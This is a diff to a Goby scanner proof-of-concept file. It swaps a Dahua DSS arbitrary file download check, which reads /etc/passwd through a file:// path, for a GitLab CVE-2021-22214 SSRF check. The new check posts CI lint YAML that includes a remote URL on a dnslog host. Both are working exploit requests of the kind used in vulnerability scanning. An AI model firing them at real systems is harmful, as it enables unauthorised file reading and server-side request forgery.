@@ -1,23 +1,23 @@
 {
-      "Name": "大华DSS系统 任意文件下载漏洞",
+      "Name": "GitLab SSRF CVE-2021-22214",
       "Level": "3",
       "Tags": [],
-      "GobyQuery": "title=\"DSS-平安城市\"",
-      "Description": "浙江大华DSS（digital surveillance system）是一款集视频、报警、门禁、对讲四大安防子系统管理功能于一体的综合管理平台。\n浙江大华技术股份有限公司DSS存在任意文件下载漏洞，攻击者可利用该漏洞登录界面下载任意文件获取敏感信息。",
-      "Product": "浙江大华DSS（digital surveillance system）",
-      "Homepage": "https://www.dahuatech.com/",
-      "Author": "ying",
+      "GobyQuery": "app=\"GitLab\"",
+      "Description": "GitLab存在前台未授权SSRF漏洞，未授权的攻击者也可以利用该漏洞执行SSRF攻击（CVE-2021-22214）。该漏洞源于对用户提供数据的验证不足，远程攻击者可通过发送特殊构造的 HTTP 请求，欺骗应用程序向任意系统发起请求。攻击者成功利用该漏洞可获得敏感数据的访问权限或向其他服务器发送恶意请求。",
+      "Product": "Gitlab > 10.5",
+      "Homepage": "https://gobies.org/",
+      "Author": "luckying",
       "Impact": "",
       "Recommandation": "",
       "References": [
-            "https://www.pwnwiki.org/index.php?title=CNVD-2020-61986_%E5%A4%A7%E8%8F%AFDSS%E7%B3%BB%E7%B5%B1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BC%89%E6%BC%8F%E6%B4%9E/zh-cn"
+            "https://gobies.org/"
       ],
 	  "HasExp": true,
 	  "ExpParams": [
 		{
-			"name": "file",
+			"name": "URL",
 			"type": "input",
-			"value": "/etc/passwd",
+			"value": "test.dnslog.cn",
 			"show": ""
 		}
 	  ],
@@ -25,12 +25,16 @@
             "AND",
             {
                   "Request": {
-                        "method": "GET",
-                        "uri": "/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd",
+                        "method": "POST",
+                        "uri": "/api/v4/ci/lint",
                         "follow_redirect": false,
-                        "header": {},
+                        "header": {
+                              "Content-Type": "application/json",
+                              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                              "Content-Length": ""
+                        },
                         "data_type": "text",
-                        "data": ""
+                        "data": "{\"include_merged_yaml\":true,\"content\":\"include:\\n  remote: http://test.dnslog.cn/api/v1/targets?test.yml\",\"wglt1cskpv\":\"=\"}"
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -47,7 +51,7 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "root",
+                                    "value": "test.dnslog.cn",
                                     "bz": ""
                               }
                         ]
@@ -59,12 +63,16 @@
             "AND",
             {
                   "Request": {
-                        "method": "GET",
-                        "uri": "/itc/attachment_downloadByUrlAtt.action?filePath=file://{{{file}}}",
+                        "method": "POST",
+                        "uri": "/api/v4/ci/lint",
                         "follow_redirect": false,
-                        "header": {},
+                        "header": {
+                              "Content-Type": "application/json",
+                              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                              "Content-Length": ""
+                        },
                         "data_type": "text",
-                        "data": ""
+                        "data": "{\"include_merged_yaml\":true,\"content\":\"include:\\n  remote: http://{{{URL}}}/api/v1/targets?test.yml\",\"wglt1cskpv\":\"=\"}"
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -81,7 +89,7 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "root",
+                                    "value": "test.dnslog.cn",
                                     "bz": ""
                               }
                         ]
@@ -91,6 +99,6 @@
 				  ]
             }
       ],
-      "PostTime": "2021-06-12 22:15:27",
+      "PostTime": "2021-07-01 20:34:22",
       "GobyVersion": "1.8.268"
 }
